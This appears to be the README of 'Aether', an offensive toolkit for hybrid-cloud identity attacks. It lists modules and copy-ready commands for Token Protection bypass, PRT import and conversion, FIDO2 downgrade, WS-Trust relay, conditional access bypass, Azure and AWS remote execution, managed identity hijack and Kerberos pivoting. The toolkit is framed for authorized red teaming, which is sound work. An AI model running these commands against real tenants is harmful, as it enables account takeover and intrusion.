# Aether v2.0.0

> **The Impacket for the Hybrid Cloud Era**

Aether is a unified, low-level protocol exploitation toolkit for modern identity fabrics (Entra ID, OAuth2, OIDC, SAML, WS-Trust, and cloud APIs). It is designed for **authorized penetration testing and red team operations** against hybrid cloud environments.

## Core Modules

| Module | Purpose |
|--------|---------|
| `aether token` | Token Protection & channel binding operations (`token protect`, `token show`) |
| `aether prt` | PRT → OAuth (MS-OAPX), PRT import/extract from dumps, Token Protection bypass |
| `aether relay` | WS-Trust/SAML relay, device code, session stretch, CAE handler (`relay cae`), FIDO2 downgrade (`relay fido2`), MEX |
| `aether cap` | Parse + offline-evaluate CAP, `cap exploit` (live bypass sim), `cap matrix` |
| `aether exec` | Azure RunCommand, AWS SSM (SigV4), GitHub Actions, `exec imds`, SP secrets |
| `aether validate` | BloodHound paths, OPSEC risk scoring, `validate soc`, `validate stealth` |
| `aether pivot` | Cloud→onprem Kerberos TGT via MS-KKDCP (writes MIT ccache), IMDS |
| `aether graph` | Cross-provider identity graph, `graph qualify` + `graph correlate` |
| `aether workspace` | Encrypted engagement workspaces (AES-256-GCM + Argon2id), `workspace rekey` |
| `aether run` | Kill-chain orchestration with `--auto` autonomous mode and risk gates |
| `aether replay` | Dry-run or confirmed replay of saved operation runbooks |
| `aether export` | Engagement reports (markdown), SARIF 2.1.0, graph topology |
| `aether simulate` | SOC telemetry emulation (JSON) for detection engineering |
| `aether serve` / `aether connect` | mTLS teamserver for multi-operator sync |

## Architecture

```
CLI (Cobra) → Engines → Protocol layer (OAuth2/OIDC, SAML, WS-Trust, MS-OAPX)
            → Transport (uTLS JA3/JA4 spoofing, HTTP/2, retry/backoff)
            → Persistence (BoltDB, JSON config, zap logging)
```

## Build

```bash
go mod tidy
make build          # produces ./bin/aether (host platform)
make test           # unit tests
make build-all      # linux + macOS + Windows, amd64 + arm64
aether doctor       # verify the host environment
```

See [docs/PLATFORM.md](docs/PLATFORM.md) for the full OS support matrix (Windows/macOS/Linux/BSD), per-OS directory layout, signals, and install instructions.

Requires Go 1.22+. No CGO — every binary is fully static.

## Usage Examples

```bash
# Workspaces (Phase 1): everything belongs to a workspace
aether workspace create ClientX
export AETHER_PASSPHRASE='op-passphrase'

# Import PRT + TLS binding (Token Protection bypass)
aether prt import --prt prt.bin --tls-binding binding.bin --workspace ClientX
aether prt convert --prt-file prt.bin --tls-binding binding.bin --resource https://graph.microsoft.com/.default

# Relay / downgrade (Phase 2)
aether relay mex --domain corp.com --mex mex.xml
aether relay fido2-downgrade --username user@corp.com --domain corp.com --mex mex.xml
aether relay cae-handler --refresh-token <rt> --tenant <tenant>

# Cloud execution (Phase 3)
aether exec azure --token <arm-token> --subscription-id <sub> --resource-group rg --vm-id vm-01 --cmd "id"
aether exec aws --access-key AKIA... --secret-key ... --instance-id i-123 --cmd "whoami"
aether pivot imds --resource https://management.azure.com/   # managed identity hijack

# Cloud -> onprem pivot (Phase 4): writes aether.ccache
aether pivot cloud-to-onprem --token <token> --domain INTERNAL.LOCAL --user alice
export KRB5CCNAME=/tmp/aether.ccache

# Graph + validation (situational awareness)
aether graph build --input users.json,aws.json --kind entra:users,aws --output graph.json
aether graph qualify --graph graph.json --path u1,role:xyz
aether validate path --bh-json path.json --risk-threshold 30
aether validate soc --action wstrust_relay --unknown-location

# Orchestration (all phases, risk-gated, --low-slow paced)
aether run --workspace ClientX --policies policies.json --bh-json path.json --risk-threshold 50 --low-slow

# Teamserver (multi-operator)
aether serve --listen 127.0.0.1:7788
aether connect --server 127.0.0.1:7788 --exec "aether prt convert" --insecure

# Exit (Phase 5): report + secure delete
aether workspace report --workspace ClientX --output report.md
aether workspace delete ClientX --force
```

## Configuration

`aether.json` in the working directory, or `~/.config/aether/config.json`:

```json
{
  "log_level": "info",
  "timeout": 30,
  "browser_preset": "chrome",
  "max_risk_threshold": 50
}
```

`browser_preset` selects the uTLS fingerprint: `chrome`, `edge`, or `firefox`.

## Legal

This tool is provided for authorized security assessments only. Unauthorized access to computer systems is illegal. The authors accept no liability for misuse.
